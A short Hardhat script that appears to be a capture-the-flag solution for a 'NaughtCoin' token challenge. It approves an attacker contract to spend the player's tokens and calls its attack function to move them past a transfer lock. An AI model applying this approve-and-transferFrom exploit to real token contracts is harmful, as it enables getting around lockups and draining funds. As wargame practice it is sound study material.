const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x106C3c52Df53EF40E77c428F680C1c53f983C8Dc";
const INSTANCE_ADDRESS = "0x87d3Ef254e405a4fA68c64d16d3946f8cedF8800";
const VALUE = ethers.utils.parseEther("1000000");

async function main() {
    const naughtCoinAttacker = await ethers.getContractAt("NaughtCoinAttack", ATTACKER_ADDRESS);
    const instance = await ethers.getContractAt("NaughtCoin", INSTANCE_ADDRESS);


    // Approve the attacker to use tokens.
    const approveTx = await instance.approve(ATTACKER_ADDRESS, VALUE);
    await approveTx.wait();


    // Execute the attack.
    const transferTx = await naughtCoinAttacker.attack(VALUE);
    const attackReceipt = await transferTx.wait();
    console.log("attackReceipt: ", attackReceipt);


}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});